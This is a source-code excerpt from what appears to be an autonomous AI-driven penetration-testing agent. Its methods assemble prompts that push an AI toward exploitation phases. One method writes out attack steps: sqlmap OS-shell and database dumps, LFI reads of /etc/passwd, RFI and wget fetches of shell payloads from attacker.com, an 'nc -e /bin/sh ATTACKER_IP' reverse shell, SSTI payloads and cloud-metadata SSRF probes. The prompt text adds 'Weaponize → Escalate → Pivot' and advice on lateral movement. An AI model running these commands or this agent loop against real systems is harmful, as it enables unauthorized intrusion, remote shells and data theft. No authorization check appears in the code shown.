        base_url = f"http://{host}:{web_port}" if web_port else f"http://{host}"

        for finding in self.model.findings[-5:]:
            title = (finding.title or "").lower()
            sev = (finding.severity or "info").lower()
            desc = (finding.description or "").lower()

            # SQL Injection
            if any(kw in title or kw in desc for kw in ["sql", "sqli", "sql injection", "mysql", "database"]):
                lines.append(f"  [SQLi] {finding.title}")
                lines.append(f"    Step 1: sqlmap -u '{base_url}?id=1' --batch --random-agent --level 3 --risk 2")
                lines.append(f"    Step 2: sqlmap -r captured_request.txt --batch --os-shell")
                lines.append(f"    Step 3: sqlmap -u '{base_url}?id=1' --batch --dbs --tables --dump")

            # XSS
            if any(kw in title or kw in desc for kw in ["xss", "cross-site", "cross site"]):
                lines.append(f"  [XSS] {finding.title}")
                lines.append(f"    Step 1: dalfox url {base_url} --mining-dom --mass --custom-payload XSS_PAYLOAD")
                lines.append(f"    Step 2: xsstrike -u '{base_url}?q=test' --fuzzer --params")
                lines.append(f"    Step 3: Blind XSS → xsshunter or interactsh payload in User-Agent / Referer")

            # LFI / RFI
            if any(kw in title or kw in desc for kw in ["lfi", "rfi", "file inclusion", "path traversal", "local file"]):
                lines.append(f"  [LFI] {finding.title}")
                lines.append(f"    Step 1: curl -sik '{base_url}/index.php?page=../../../etc/passwd'")
                lines.append(f"    Step 2: curl -sik '{base_url}/index.php?page=php://filter/convert.base64-encode/resource=config.php'")
                lines.append(f"    Step 3: RFI → curl -sik '{base_url}/index.php?page=http://attacker.com/shell.txt'")
                lines.append(f"    Step 4: Log poisoning → /var/log/apache2/access.log with PHP payload in UA")

            # SSRF
            if any(kw in title or kw in desc for kw in ["ssrf", "server-side request"]):
                lines.append(f"  [SSRF] {finding.title}")
                lines.append(f"    Step 1: curl -sik '{base_url}/?url=http://169.254.169.254/latest/meta-data/' (AWS)")
                lines.append(f"    Step 2: curl -sik '{base_url}/?url=http://metadata.google.internal/' (GCP)")
                lines.append(f"    Step 3: curl -sik '{base_url}/?url=http://127.0.0.1:22' (internal port scan)")
                lines.append(f"    Step 4: Blind SSRF → interactsh OOB already injected in nuclei/sqlmap")

            # RCE / Command Injection
            if any(kw in title or kw in desc for kw in ["rce", "command injection", "remote code", "shell", "exec"]):
                lines.append(f"  [RCE] {finding.title}")
                lines.append(f"    Step 1: Verify → curl -sik '{base_url}/?cmd=id' (expect uid=)")
                lines.append(f"    Step 2: curl -sik '{base_url}/?cmd=cat+/etc/passwd'")
                lines.append(f"    Step 3: curl -sik '{base_url}/?cmd=ls+-la+/root'")
                lines.append(f"    Step 4: curl -sik '{base_url}/?cmd=wget+http://attacker.com/shell.sh'")
                lines.append(f"    Step 5: Reverse shell → nc -e /bin/sh ATTACKER_IP 4444")

            # SSTI
            if any(kw in title or kw in desc for kw in ["ssti", "template", "server-side template"]):
                lines.append(f"  [SSTI] {finding.title}")
                lines.append(f"    Test: curl -sik '{base_url}/?name={{{{7*7}}}}' (expect 49)")
                lines.append(f"    Jinja2: curl -sik '{base_url}/?name={{{{'cat /etc/passwd'|system}}}}'")
                lines.append(f"    Java: curl -sik '{base_url}/?name=${{7*7}}'")
                lines.append(f"    Freemarker: curl -sik '{base_url}/?name=<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}'")

            # IDOR / Auth bypass
            if any(kw in title or kw in desc for kw in ["idor", "auth bypass", "unauth", "insecure direct", "privilege escalation"]):
                lines.append(f"  [IDOR] {finding.title}")
                lines.append(f"    Step 1: ffuf -u '{base_url}/api/users/FUZZ' -w ids.txt -mc 200 -fs 0")
                lines.append(f"    Step 2: ffuf -u '{base_url}/api/v2/users/FUZZ' -w ids.txt -mc 200")
                lines.append(f"    Step 3: Try cookie tampering (admin=1, role=admin), JWT none-alg attack")

            # GraphQL
            if any(kw in title or kw in desc for kw in ["graphql", "gql", "graphql introspection"]):
                lines.append(f"  [GraphQL] {finding.title}")
                lines.append(f"    Step 1: curl -sik '{base_url}/graphql?query={{__schema{{types{{name}}}}}}'")
                lines.append(f"    Step 2: curl -X POST '{base_url}/graphql' -H 'Content-Type: application/json' -d '{{\"query\":\"query{{__schema{{types{{name,fields{{name}}}}}}}}\"}}'")
                lines.append(f"    Step 3: Batch attack → ffuf -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"FUZZ\"}}' -w gql_payloads.txt")

            # Generic critical/high
            if sev in ("critical", "high") and not any(kw in title or kw in desc for kw in [
                "sql", "xss", "lfi", "rfi", "ssti", "ssrf", "rce", "upload", "idor", "graphql"
            ]):
                lines.append(f"  [CRITICAL/HIGH] {finding.title}")
                lines.append(f"    Step 1: nuclei -u '{base_url}' -severity critical,high -silent")
                lines.append(f"    Step 2: searchsploit with identified service + version")
                lines.append(f"    Step 3: curl -sik '{base_url}/' with modified headers (X-Forwarded-For, X-Real-IP)")

        if len(lines) == 1:
            return ""
        lines.append("PRIORITY: Execute steps IN ORDER for each finding. Verify → Weaponize → Escalate → Pivot.")
        return "\n".join(lines) + "\n"

    def _auth_context(self) -> str:
        """Generate authenticated scanning guidance based on configured credentials."""
        lines = []
        cookie = os.getenv("X19_COOKIE", "") or ""
        auth_header = os.getenv("X19_AUTH_HEADER", "") or ""
        if cookie:
            lines.append(f"AUTH COOKIE: {cookie[:80]}... (set X19_COOKIE env)")
            lines.append("Use with: curl --cookie 'SESSION=...' or pass to browser crawler")
        if auth_header:
            lines.append(f"AUTH HEADER: {auth_header[:80]}... (set X19_AUTH_HEADER env)")
            lines.append("Use with: curl -H 'Authorization: Bearer ...'")
        if lines:
            lines.insert(0, "=== AUTHENTICATED ACCESS ===")
            lines.append("Authenticated scans often reveal hidden endpoints, IDORs, and priv-esc paths.")
            return "\n".join(lines) + "\n"
        return ""

    def _param_fuzzing_context(self) -> str:
        """Generate parameter fuzzing guidance based on discovered endpoints."""
        if not self.model.endpoints:
            return ""
        lines = ["=== PARAMETER FUZZING ==="]
        host = re.sub(r'^https?://', '', self.target).split('/')[0]
        web_port = self._get_web_port()
        base_url = f"http://{host}:{web_port}" if web_port else f"http://{host}"

        lines.append("Hidden parameters often lead to critical bugs (IDOR, SQLi, SSRF).")
        if self._check_tool("arjun"):
            lines.append(f"  arjun -u '{base_url}/api/endpoint' --get --headers -oT params.txt")
        if self._check_tool("ffuf"):
            lines.append(f"  ffuf -u '{base_url}/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/api.txt -mc 200,201,204 -t 50")
            lines.append(f"  ffuf -u '{base_url}/api/action?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/parameters.txt -mc 200,500")
        if self._check_tool("paramspider"):
            lines.append(f"  paramspider -d {host} --level high -o params.txt")
        lines.append(f"  Manual: curl -X POST '{base_url}/api/endpoint' -H 'Content-Type: application/json' -d '{{\"test\":\"value\"}}'")
        lines.append(f"  Try HTTP method override: curl -X PUT '{base_url}/api/endpoint'")
        return "\n".join(lines) + "\n"

    def _js_analysis_context(self) -> str:
        """Generate JavaScript analysis guidance for endpoint discovery."""
        endpoints = [e for e in self.model.endpoints if any(ext in e.get('url','').lower() for ext in ['.js', '.jsx', '.ts', '.tsx', '.vue', '.min.js'])]
        if not endpoints and not self.model.subdomains:
            return ""
        lines = ["=== JAVASCRIPT ANALYSIS ==="]
        lines.append("JS files contain hidden API endpoints, hardcoded secrets, and SPA routes.")
        if self._check_tool("linkfinder"):
            for ep in endpoints[:5]:
                lines.append(f"  linkfinder -i '{ep.get('url','')}' -o cli | head -50")
        if self._check_tool("subjs"):
            for sub in sorted(self.model.subdomains)[:5]:
                lines.append(f"  subjs -u 'https://{sub}' -o js_endpoints.txt 2>/dev/null | head -30")
        if self._check_tool("gau"):
            lines.append(f"  gau {host} --subs --js 2>/dev/null | head -50")
        lines.append("  Check for: API keys, AWS secrets, internal URLs, GraphQL endpoints in JS responses.")
        return "\n".join(lines) + "\n"

    def _anti_pattern_context(self) -> str:
        """Prominent block: 'do not repeat these mistakes'. Injects:
        - Top failure_memory entries with count + last error snippet
        - Dead branches (404/403/redirect paths)
        - Exhausted techniques (categories ruled out)
        - Sample exhausted endpoints
        - Cross-session lessons from ChromaDB (what worked / didn't on similar targets)
        Goal: AI sees its own past failures up-front and pivots instead of looping.
        """
        lines: list = []
        lines.append("=== DO NOT REPEAT (LESSONS LEARNED) ===")

        # 1) Top failures from FailureMemory, sorted by count desc
        fm_data = self.failure_memory._data or {}
        failures = fm_data.get("failures", {}) or {}
        ranked = sorted(
            failures.items(),
            key=lambda kv: int(kv[1].get("count", 0)),
            reverse=True,
        )[:5]
        now = time.time()
        for sig, f in ranked:
            cnt = int(f.get("count", 0))
            snip = (f.get("last_output_snippet", "") or "").replace("\n", " ")[:80]
            until = float(f.get("blocked_until", 0) or 0)
            still_blocked = " [STILL BLOCKED]" if until > now else ""
            lines.append(f"  [FAIL x{cnt}] sig={sig}{still_blocked}  last_err='{snip}'")

        # 2) Dead branches
        if self._dead_branches:
            sample = sorted(self._dead_branches)[:6]
            extra = len(self._dead_branches) - len(sample)
            tail = f" (+{extra} more)" if extra > 0 else ""
            lines.append(f"  [DEAD BRANCHES — stop probing]: {', '.join(sample)}{tail}")

        # 3) Exhausted techniques
        if self._exhausted_techniques:
            lines.append(f"  [EXHAUSTED TECHNIQUES — pivoted out]: {', '.join(sorted(self._exhausted_techniques))}")

        # 4) Exhausted endpoints (sample)
        if self._exhausted_endpoints:
            sample = sorted(self._exhausted_endpoints)[:5]
            extra = len(self._exhausted_endpoints) - len(sample)
            tail = f" (+{extra} more)" if extra > 0 else ""
            lines.append(f"  [EXHAUSTED ENDPOINTS]: {', '.join(sample)}{tail}")

        # 5) Category failure counts
        cats = fm_data.get("categories", {}) or {}
        if cats:
            cat_summary = ", ".join(
                f"{k}={int(v.get('count', 0))}" for k, v in
                sorted(cats.items(), key=lambda kv: -int(kv[1].get("count", 0)))[:6]
            )
            lines.append(f"  [CATEGORY FAILURE TOTALS]: {cat_summary}")

        # 6) Recent SESSION_OUTCOMES that failed (so AI sees the latest "this didn't work")
        recent_fails = [o for o in self._session_outcomes[-12:] if o.get("status") == "fail"]
        if recent_fails:
            lines.append("  [RECENT FAILED ATTEMPTS — pivot away]:")
            for o in recent_fails[-4:]:
                lines.append(
                    f"    - {o.get('technique', '')[:40]} on {o.get('service', '')[:20]}: "
                    f"{o.get('note', '')[:80]}"
                )

        # 7) Cross-session lessons from ChromaDB (this is the big win)
        try:
            target_ctx = self.target or ""
            if self.model and self.model.tech_stack:
                target_ctx += " " + " ".join(
                    (f"{k} {v}" if v else k) for k, v in list(self.model.tech_stack.items())[:5]
                )
            if self.model and self.model.ports:
                target_ctx += " ports:" + ",".join(
                    str(p.get("port", "")) for p in self.model.ports[:8]
                )
            lessons = self.memory.similar_lessons(target_ctx, n=4) if self.memory.ready else []
            if lessons:
                lines.append("  [PAST-SESSION LESSONS — relevant to this target]:")
                for lesson in lessons[:4]:
                    text = (lesson if isinstance(lesson, str) else str(lesson)).replace("\n", " ")[:140]
                    lines.append(f"    • {text}")
        except Exception as e:
            _swallow(e)

        # If we only added the header, add a hint line
        if len(lines) == 1:
            lines.append("  (no prior failures recorded yet — but check the SESSION OUTCOMES above for context)")

        lines.append(
            "INSTRUCTION: do NOT propose commands matching any [FAIL]/[DEAD]/[EXHAUSTED] entry above "
            "unless you can clearly explain why this time would behave differently. "
            "Bias toward techniques/paths the [PAST-SESSION LESSONS] confirm worked before."
        )
        return "\n".join(lines) + "\n"

    def _command_templates_context(self) -> str:
        """Show TOOLS registry entries for the current target type."""
        target_type = getattr(self, "target_type", "web")
        host = self.target.strip().lower()
        host = re.sub(r'^https?://', '', host).split('/')[0]
        web_host = host
        port = self._get_web_port()
        if port:
            web_host = f"{host}:{port}"
        relevant = []
        type_map = {
            "web": ["nmap_quick", "gobuster", "ffuf", "whatweb", "nuclei", "subfinder", "amass", "wpscan", "katana"],
            "network": ["nmap_quick", "nmap_full", "nmap_vuln", "masscan", "smb_enum", "smbmap", "ftp_enum", "ldap_enum"],
            "api": ["ffuf", "nuclei", "waf_detect"],
            "ctf": ["nmap_quick", "gobuster", "ffuf", "whatweb", "searchsploit"],
        }
        for key in type_map.get(target_type, type_map["web"]):
            if key in TOOLS:
                entry = TOOLS[key]
                parts = entry.split(" | ")
                cmd = parts[0] if parts else ""
                desc = parts[1] if len(parts) > 1 else ""
                timeout = parts[2] if len(parts) > 2 else ""
                web_relevant = key in ("gobuster", "ffuf", "whatweb", "nuclei", "nuclei_templates", "jaeles", "dirsearch", "sqlmap", "xsser", "xsstrike", "commix", "dalfox", "gospider", "arjun", "kiterunner", "wpscan", "joomscan", "droopescan", "katana", "dr-header", "waf_detect", "burp")
                tgt = web_host if web_relevant else host
                cmd_clean = cmd.replace("{target}", tgt).replace("{host}", host)[:120]
                relevant.append(f"  {key:20} {cmd_clean}")
                if desc:
                    relevant[-1] += f"  # {desc[:60]}"
        if relevant:
            return "COMMAND TEMPLATES (use these instead of writing raw commands):\n" + "\n".join(relevant[:10]) + "\n"
        return ""

    def _record_session_outcome(self, technique: str, service: str, command: str, status: str, note: str = ""):
        """Store a structured session outcome for cross-reference."""
        self._session_outcomes.append({
            "technique": technique[:60],
            "service": service[:30],
            "target": self.target[:60],
            "command": command[:100],
            "status": status,
            "note": note[:200],
            "iteration": len(self.session.data.get("commands", [])),
        })
        if len(self._session_outcomes) > 50:
            self._session_outcomes = self._session_outcomes[-50:]
        """Generate a basic probe command when the AI is stuck in a loop."""
        t = self.target.strip().lower()
        t = re.sub(r'^https?://', '', t)
        # IP:port pattern
        m = re.match(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)$', t)
        if m:
            ip, port = m.group(1), m.group(2)
            if port in ("443", "8443"):
                return f"curl -sik https://{ip}:{port}/"
            return f"curl -sik http://{ip}:{port}/"
        # Plain IP
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', t):
            return f"curl -sik http://{t}/"
        # URL or domain — try HTTPS first
        if self.target.startswith("https://") or self.target.startswith("http://"):
            return f"curl -sik '{self.target}'"
        return f"curl -sik 'https://{t}/'"

    def _scan_system_tools(self):
        """Scan PATH for available pentest tools and categorize missing ones."""
        self._available_tools = scan_available_tools()
        self._missing_tools = scan_missing_critical()
        self._tools_scanned = True
        n_avail = len(self._available_tools)
        n_miss = len(self._missing_tools)
        print(f"{C.D}[Tools] {n_avail} available, {n_miss} missing (install hints available){C.N}")

    def _build_attack_chain(self):
        """Build or refresh the attack plan based on current model state."""
        self.planner.build_chain(self.model, self.target_type)
        if self.planner.chain:
            m = self.planner.chain.methodology
            n = len(self.planner.chain.steps)
            print(f"{C.D}[Plan] {m} methodology — {n} steps in chain{C.N}")

    def _lessons_context(self) -> str:
        """Return recent lessons and failure patterns from this + past sessions."""
        parts = []

        if hasattr(self, "failure_memory") and self.failure_memory:
            fm_stats = self.failure_memory.stats()
            parts.append(f"LESSONS LEARNED: {fm_stats}")

            # Structured lessons
            lessons = self.failure_memory.recent_lessons(limit=5)
            if lessons:
                parts.append("RECENT LESSONS (what went wrong and why):")
                for l in lessons:
                    msg = (l.get("lesson", "") or "")[:120]
                    cat = l.get("category", "")
                    parts.append(f"  [{cat}] {msg}")

            # Most repeated failures
            top = self.failure_memory.top_failures(limit=3)
            if top:
                parts.append("TOP REPEATED FAILURES (avoid these patterns):")
                for f in top:
                    parts.append(f"  x{f['count']} — {f['snippet']}")

        # Current session lessons (explicitly recorded during this run)
        if hasattr(self, "_session_lessons") and self._session_lessons:
            parts.append("SESSION LESSONS (this run):")
            for lesson in self._session_lessons[-5:]:
                parts.append(f"  * {lesson}")

        # Stuck warnings = anti-patterns
        if hasattr(self, "_stuck_warnings") and self._stuck_warnings:
            parts.append("STUCK WARNINGS (patterns to avoid):")
            for w in self._stuck_warnings[-3:]:
                parts.append(f"  ! {w[:120]}")

        return "\n".join(parts)

    def _capabilities_context(self) -> str:
        """Structured inventory of all attack categories X19 supports — dynamic tool scan."""
        if not self._tools_scanned:
            self._scan_system_tools()

        lines = ["CAPABILITIES — available attack categories & tools:"]

        if self._available_tools:
            by_cat: dict = {}
            for name, tool in self._available_tools.items():
                by_cat.setdefault(tool.category, []).append(name)
            for cat in sorted(by_cat.keys()):
                tools = sorted(by_cat[cat])
                lines.append(f"  {cat:15} {' '.join(tools)}")

        total_cats = len(set(t.category for t in self._available_tools.values()))
        lines.append(f"\nTotal {total_cats} categories active with {len(self._available_tools)} tools.")

        if self._missing_tools:
            lines.append(f"\nMISSING TOOLS ({len(self._missing_tools)} — install for more capabilities):")
            by_cat_m: dict = {}
            for name, tool in self._missing_tools.items():
                by_cat_m.setdefault(tool.category, []).append(name)
            for cat in sorted(by_cat_m.keys())[:8]:
                tools = sorted(by_cat_m[cat])[:4]
                lines.append(f"  {cat:15} {' '.join(tools)}")
            lines.append("  (install hints available via self_improve/install_suggestion)")

        return "\n".join(lines)

    def _install_hints_context(self) -> str:
        """Generate install commands for top missing tools the planner recommends."""
        if not self._tools_scanned:
            self._scan_system_tools()
        if not self._missing_tools:
            return ""

        # Filter to tools that are in the planner chain or top missing
        planner_tools = set(planning.TOOL_IO.keys())
        relevant_missing = {k: v for k, v in self._missing_tools.items() if k in planner_tools}
        # Also include top 5 missing overall if no planner overlap
        if not relevant_missing:
            relevant_missing = dict(list(self._missing_tools.items())[:10])

        lines = ["INSTALL HINTS (tools you don't have but planner needs):"]
        for name, tool in sorted(relevant_missing.items()):
            hint = tool.install_hint or "—"
            lines.append(f"  {name:<25} {hint}")
        lines.append("Use install command above or run: pip install <package> / apt install <package>")
        return "\n".join(lines)

    def _methodology_context(self) -> str:
        """Generate attack methodology guidance based on current phase and target state."""
        model = self.model
        phase = self._current_phase()
        has_ports = len(model.ports) > 0
        has_subdomains = len(model.subdomains) > 0
        has_endpoints = len(model.endpoints) > 0
        has_findings = len(model.findings) > 0
        has_creds = len(model.credentials) > 0
        active_hyps = [h for h in self._hypotheses.values() if h.state == HYP_STATE_TESTING]
        lines = [f"CURRENT PHASE: {phase}"]
        if phase == "recon":
            lines.append("  DIRECTION: Surface area mapping — discover subdomains, ports, endpoints, tech stack.")
            lines.append("  ACTION: subfinder/amass → httpx → whatweb → katana/ffuf")
            if has_ports:
                lines.append("  NEXT: Fingerprint open services — identify versions then generate hypotheses")
            if has_subdomains:
                lines.append("  NEXT: Probe subdomains for live hosts, different tech stacks")
            lines.append("  TRANSITION: When you have enough data (ports + tech stack), move to Hypothesis Generation.")
        elif phase == "hypothesis":
            lines.append("  DIRECTION: Form specific, testable vulnerability hypotheses based on recon data.")
            lines.append("  ACTION: Review tech stack, open ports, endpoints. For each service, ask:")
            lines.append("    - What CVEs affect this version?")
            lines.append("    - What misconfigurations are common for this service?")
            lines.append("    - What attack classes apply? (SQLi, XSS, IDOR, SSRF, auth bypass)")
            lines.append("  OUTPUT: Propose 1-3 specific hypotheses. Each must be testable with a single command.")
            lines.append("  EXAMPLE: 'If /api/users/[id] has no auth, then IDOR is possible — test with sequential IDs'")
            if active_hyps:
                lines.append(f"  ACTIVE HYPOTHESES ({len(active_hyps)}):")
                for h in active_hyps:
                    lines.append(f"    [{h.score:.1f}] {h.key.split(':',1)[-1].replace('_',' ')}")
        elif phase == "validation":
            lines.append("  DIRECTION: Test active hypotheses with precise commands.")
            lines.append("  ACTION: For each hypothesis, run the minimum command needed to confirm or deny.")
            lines.append("  SCORING: Each failed test reduces hypothesis score by 0.2.")
            lines.append("  DEAD: After 5 failed validations, hypothesis is marked DEAD and cannot be retested.")
            lines.append("  PIVOT: If all active hypotheses are DEAD, return to Hypothesis Generation.")
            if active_hyps:
                lines.append(f"  ACTIVE HYPOTHESES ({len(active_hyps)}):")
                for h in sorted(active_hyps, key=lambda x: x.score, reverse=True):
                    status = f"score={h.score:.1f} attempts={h.attempts}"
                    lines.append(f"    [{status}] {h.key.split(':',1)[-1].replace('_',' ')}")
                    if h.attempts >= HYP_SCORE_REDUCE_THRESHOLD:
                        lines.append(f"      ⚠ {h.attempts}/{HYP_DEAD_THRESHOLD} fails — {HYP_DEAD_THRESHOLD - h.attempts} more until DEAD")
        elif phase == "exploitation":
            lines.append("  DIRECTION: Weaponize confirmed hypotheses — turn evidence into impact.")
            lines.append("  ACTION: For each confirmed finding, run the exploitation chain.")
            lines.append("  CHAINING: Combine low-severity issues to escalate privilege or access.")
            if has_findings:
                lines.append("  NEXT: Attempt lateral movement or privilege escalation.")
            confirmed = [h for h in self._hypotheses.values() if h.state == HYP_STATE_CONFIRMED]
            if confirmed:
                lines.append(f"  CONFIRMED ({len(confirmed)}):")
                for h in confirmed:
                    lines.append(f"    {h.key.split(':',1)[-1].replace('_',' ')}")
        lines.append("")
        lines.append("METHODOLOGY RULES:")
        lines.append("  1. Recon → Hypothesis → Validation → Exploitation. Never skip phases.")
        lines.append("  2. Move to next phase when current phase produces no new results (3 empty iterations).")
        lines.append("  3. When you CONFIRM a hypothesis, STOP broadening and go DEEPER on that lead.")
        lines.append("  4. After 3 failed validations, hypothesis score drops — focus on higher-scored hypotheses.")
        lines.append("  5. After 5 failed validations, hypothesis is DEAD. Generate a new hypothesis.")
        lines.append("  6. A DEAD hypothesis can only be revived if genuinely new evidence appears.")
        lines.append("  7. Dead ends are valid results — document what was tested and move on.")
        return "\n".join(lines)

    def _current_phase(self) -> str:
        """Determine the current attack phase based on target model state."""
        model = self.model
        if self._forced_exploit:
            return "exploitation"
        has_ports = len(model.ports) > 0
        has_subdomains = len(model.subdomains) > 0
        has_endpoints = len(model.endpoints) > 0
        has_findings = len(model.findings) > 0
        has_tech = bool(model.tech_stack)
        testable_hyps = [h for h in self._hypotheses.values()
                         if h.state in (HYP_STATE_NEW, HYP_STATE_TESTING) and h.score >= 0.4]
        dead_hyps = [h for h in self._hypotheses.values() if h.state == HYP_STATE_DEAD]
        confirmed = [h for h in self._hypotheses.values() if h.state == HYP_STATE_CONFIRMED]
        if confirmed and has_findings:
            return "exploitation"
        if testable_hyps:
            return "validation"
        if (has_ports or has_subdomains or has_endpoints or has_tech) and not dead_hyps:
            return "hypothesis"
        if not has_ports and not has_subdomains and not has_endpoints:
            return "recon"
        return "hypothesis"

    def _scope_tool_suggestions(self) -> str:
        """Generate a context block suggesting tools based on actual discoveries and current phase.
        Never suggests nmap if ports already known — forces methodology forward."""
        if not self.model:
            return ""
        target_type = getattr(self, "target_type", "web")
        tech = " ".join(f"{k} {v}" for k, v in (self.model.tech_stack or {}).items()).lower()
        open_ports = set()
        try:
            open_ports = {int(p["port"]) for p in self.model.ports}
        except Exception:
            pass
        has_web_port = bool(open_ports & {80, 443, 8080, 8443, 8000, 3000, 5000})

        # Phase-aware tool distribution — sample tools based on current phase
        phase = self._current_phase()
        phase_tools = get_tools_for_phase(target_type=target_type, phase=phase)
        phase_suggestions = ""
        if phase_tools:
            existing_tools = {t.split()[0] for t in phase_tools if t}
            available_phase_tools = [t for t in existing_tools if self._check_tool(t)]
            if available_phase_tools:
                phase_suggestions = f"PHASE TOOLS [{phase}]: {' '.join(available_phase_tools[:10])}\n"

        suggestions = []
        # Methodology-driven suggestions (never suggest nmap if ports known)
        if has_web_port:
            suggestions.append(("Web fingerprint", ["whatweb", "curl"], "Identify CMS, framework, server version"))
            suggestions.append(("Directory bust", ["gobuster", "ffuf", "dirsearch"], "Discover hidden endpoints"))
            suggestions.append(("Vuln scan", ["nuclei", "whatweb"], "Check for known CVEs and misconfigs"))
            suggestions.append(("Sensitive files", ["curl"], "Check /.env, /robots.txt, /.git/HEAD, /phpinfo.php"))
            suggestions.append(("Tech-specific", ["wpscan", "joomscan"], "CMS vulnerability scanning"))
        elif open_ports:
            suggestions.append(("Service enum", ["nmap -sV", "curl"], "Fingerprint open services"))
            suggestions.append(("Banner grab", ["curl", "nc"], "Grab service banners from open ports"))
        else:
            suggestions.append(("Port scan", ["nmap", "masscan"], "Discover open ports and services"))
        # Filter out suggestions for tools in exhausted/banned categories
        used_families = set(self._tool_family_history[-10:])
        fresh = []
        for tech, tools, reason in suggestions:
            available = [t for t in tools if self._check_tool(t)][:2]
            if available:
                line = f"  {tech}: {'/'.join(available)} — {reason}"
                if not any(f in used_families for f in TOOL_FAMILIES
                    if any(t.split('/')[0] in line for t in [next(iter(TOOL_FAMILIES[f]))])):
                    fresh.append(line)
        result = ""
        if phase_suggestions:
            result += phase_suggestions
        if fresh:
            result += "SCOPE TOOLS (use these based on current phase):\n" + "\n".join(fresh[:4]) + "\n"
        return result

    def _cmd_category(self, cmd: str) -> str:
        """Classify a command into a service category for iteration limiting."""
        cmd_lower = cmd.lower()
        if any(w in cmd_lower for w in ['linpeas', 'winpeas', 'pspy', 'linux-exploit-suggester', 'sudo -l', 'sudo -n -l', '-perm -4000', 'gtfobins']):
            return "privesc"
        if any(w in cmd_lower for w in ['apktool', 'jadx', 'apkleaks', 'aapt', 'mobsfscan', 'frida', 'objection', 'adb ', 'adb shell', '.apk', '.ipa', 'drozer']):
            return "mobile"
        if any(w in cmd_lower for w in ['trivy', 'kube-hunter', 'kubeaudit', 'kubectl', 'docker-bench', 'helm ']):
            return "container"
        if any(w in cmd_lower for w in ['dalfox', 'crlfuzz']):
            return "web_exploit"
        if any(w in cmd_lower for w in ['arjun', 'paramspider', 'gospider', 'kiterunner', 'kr scan', 'katana']):
            return "web_dirbust"
        if any(w in cmd_lower for w in ['nmap', 'masscan', 'rustscan']) or re.search(r'\bport\b', cmd_lower):
            return "port_scan"
        if any(w in cmd_lower for w in ['subdomain', 'amass', 'sublist3r', 'subfinder', 'crt.sh', 'crt', 'certificate', 'ctlogs', 'assetfinder', 'findomain']):
            return "subdomain_recon"
        if any(w in cmd_lower for w in ['dns', '53', 'dig', 'nslookup', 'host ', 'dnsx', 'dnsrecon']):
            return "dns_recon"
        if any(w in cmd_lower for w in ['whatweb', 'wappalyzer', 'wpscan', 'joomscan', 'droopescan', 'tech-detect']):
            return "fingerprint"
        if any(w in cmd_lower for w in ['dirsearch', 'gobuster', 'ffuf', 'dirb', 'wfuzz', 'dirbuster', 'directory']):
            return "web_dirbust"
        if any(w in cmd_lower for w in ['nuclei', 'jaeles', 'scanner', 'whatweb']):
            return "web_scanner"
        if any(w in cmd_lower for w in ['sqlmap', 'nosqli', 'sqli', 'injection']):
            return "web_exploit"
        if any(w in cmd_lower for w in ['curl', 'wget', 'http', 'https://']):
            return "web"
        if any(w in cmd_lower for w in ['smb', '445', 'smbclient', 'crackmapexec', 'smbmap']):
            return "smb"
        if any(w in cmd_lower for w in ['ldap', '389', 'kerberos', 'bloodhound', 'impacket', 'adcs', 'kerbrute', 'getnpusers', 'getuserspns', 'secretsdump', 'certipy', 'netexec', 'nxc ', 'responder']):
            return "ad"
        if any(w in cmd_lower for w in ['ssh', '22', 'ssh-', 'ssh-audit']):
            return "ssh"
        if any(w in cmd_lower for w in ['sql', 'mysql', 'mariadb', '3306', '1433', 'postgres', 'mongodb', 'redis', 'mongod']):
            return "database"
        if any(w in cmd_lower for w in ['grep', 'cat ', 'head ', 'tail ', 'echo ', 'ls ', 'find ', 'sort ', 'uniq ', 'wc ']):
            return "analysis"
        if any(w in cmd_lower for w in ['ping', 'traceroute', 'fping', 'hping']):
            return "network"
        if any(w in cmd_lower for w in ['snmp', 'snmpwalk', 'snmpcheck']):
            return "network"
        if any(w in cmd_lower for w in ['ssl', 'tls', 'testssl']):
            return "web_scanner"
        if any(w in cmd_lower for w in ['rdp', '3389']):
            return "network"
        if any(w in cmd_lower for w in ['waf', 'cloud_metadata', '169.254']):
            return "web_scanner"
        return "other"

    def _strip_cmd(self, cmd: str) -> str:
        """Normalize a command by removing temp filenames, random tokens."""
        s = cmd.strip()
        s = re.sub(r'/tmp/[a-zA-Z0-9_\.\-]+', '/tmp/_', s)
        s = re.sub(r'sesskey"[^"]*"', 'sesskey"_"', s)
        s = re.sub(r'MoodleSession=[a-zA-Z0-9]+', 'MoodleSession=_', s)
        return s

    # ===================== COMMAND VALIDATION =====================

    TOOL_CHECK_CACHE: Dict[str, bool] = {}
    _INSTALLED_TOOLS_SNAPSHOT: list = []
    _INSTALLED_TOOLS_EXPIRY: float = 0.0

    def _check_tool(self, tool: str) -> bool:
        """Check if a tool is installed, with caching."""
        if tool in self.TOOL_CHECK_CACHE:
            return self.TOOL_CHECK_CACHE[tool]
        try:
            check_cmd = f"where {tool} 2>nul" if os.name == "nt" else f"which {tool} 2>/dev/null"
            r = subprocess.run(check_cmd, shell=True, capture_output=True, text=False, timeout=5)
            so = r.stdout.decode("utf-8", errors="replace") if r.stdout else ""
            found = r.returncode == 0 and so.strip() != ""
            self.TOOL_CHECK_CACHE[tool] = found
            return found
        except Exception:
            self.TOOL_CHECK_CACHE[tool] = False
            return False

    def _installed_tools_snapshot(self) -> list:
        """Return a snapshot of which common security tools are actually installed.
        Cached for 300s to avoid repeatedly shelling out."""
        import time as _time
        if self._INSTALLED_TOOLS_SNAPSHOT and _time.time() < self._INSTALLED_TOOLS_EXPIRY:
            return self._INSTALLED_TOOLS_SNAPSHOT
        # Core tools that matter most for security work
        # NOTE: Keep this list updated with commonly hallucinated tool names
        # so they show up as "NOT AVAILABLE" and the AI stops suggesting them.
        core = ["nmap", "masscan", "curl", "wget", "dig", "nslookup", "whois", "openssl",
                "subfinder", "httpx", "nuclei", "ffuf", "gobuster", "whatweb",
                "dnsx", "katana", "gau", "amass", "assetfinder", "findomain",
                "smbclient", "smbmap", "crackmapexec", "netexec", "enum4linux",
                "hydra", "sqlmap", "dirsearch", "dirbuster", "wpscan",
                "sublist3r", "dalfox", "gospider", "arjun", "crlfuzz",
                "dnsrecon", "testssl", "searchsploit", "msfconsole",
                "ssh", "sshpass", "ssh-audit", "snmpwalk", "ldapsearch",
                "trivy", "kubectl", "docker", "pspy64",
